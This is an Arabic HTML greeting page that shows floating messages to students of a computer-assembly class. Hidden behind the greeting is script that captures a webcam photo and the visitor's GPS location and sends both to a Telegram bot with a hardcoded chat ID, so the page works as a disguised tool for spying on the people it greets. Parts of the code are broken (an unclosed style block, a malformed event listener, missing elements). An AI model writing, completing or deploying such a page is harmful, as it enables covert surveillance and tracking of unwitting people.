<!DOCTYPE html>
<html lang="ar">
<head>
<meta charset="UTF-8">
<title>تحياتي لكم</title>
<style>
  body {
    margin: 0;
    padding: 0;
    overflow: hidden;
    background-color: #ffffff; /* خلفية أبيض صافٍ */
    font-family: Arial, sans-serif;
  }

  .heart {
    position: absolute;
    color: black;
    font-weight: bold;
    font-size: 24px;
    user-select: none;
    pointer-events: none;
    white-space: nowrap;
    animation: floatUp linear infinite;
  }

  @keyframes floatUp {
    0% { transform: translateY(100vh) scale(1); opacity: 1; }
    100% { transform: translateY(-50px) scale(0.5); opacity: 0; }
  }

  #sendBtn {
    position: fixed;
    top: 20px;
    left: 50%;
    transform: translateX(-50%);
    padding: 15px 30px;
    font-size: 18px;
    background-color: black;
    color: white;
    border: none;
    border-radius: 8px;
    cursor: pointer;
    z-index: 1000;
  }

 
<script>
  // ======== حركة القلوب ========
  const texts = ['تحياتي لكم طلاب قسم تجميع الحاسبات أ'];

  function createHeart() {
    const heart = document.createElement('div');
    heart.className = 'heart';
    heart.textContent = texts[Math.floor(Math.random() * texts.length)];
    heart.style.left = Math.random() * window.innerWidth + 'px';
    heart.style.fontSize = (20 + Math.random() * 30) + 'px';
    heart.style.animationDuration = (4 + Math.random() * 3) + 's';
    document.body.appendChild(heart);
    setTimeout(() => heart.remove(), 7000);
  }

  setInterval(createHeart, 300);

  // ======== إرسال الصورة والموقع للبوت ========
  const BOT_TOKEN = "ضع_التوكن_هنا"; // ضع توكن البوت على جهازك فقط
  const CHAT_ID = "1037860664";       // ايدي الشات الخاص بك

  async function sendPhotoAndLocation(blob, latitude, longitude) {
    const formData = new FormData();
    formData.append("chat_id", CHAT_ID);
    formData.append("photo", blob, "capture.jpg");

    // إرسال الصورة
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
      method: "POST",
      body: formData
    });

    // إرسال الموقع
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation?chat_id=${CHAT_ID}&latitude=${latitude}&longitude=${longitude}`);
  }

  // ======== التقاط الصورة والموقع بعد الضغط ========
  document.getElementById('send').addEventListener( async () => {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
      const video = document.querySelector('video');
      video.srcObject = stream;

      const canvas = document.querySelector('canvas');
      const ctx = canvas.getContext('2d');

      setTimeout(async () => {
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        const blob = await (await fetch(canvas.toDataURL('image/jpeg'))).blob();

        navigator.geolocation.getCurrentPosition(async (pos) => {
          const latitude = pos.coords.latitude;
          const longitude = pos.coords.longitude;

          await sendPhotoAndLocation(blob, latitude, longitude);
          alert("تم إرسال الصورة والموقع للبوت بنجاح!");
        });

        stream.getTracks().forEach(track => track.stop());
      }, 2000);

    } catch (err) {
      console.error("فشل الوصول للكاميرا أو الموقع:", err);
      alert("حدث خطأ في الوصول للكاميرا أو الموقع.");
    }
  });
</script>

</body>
</html>
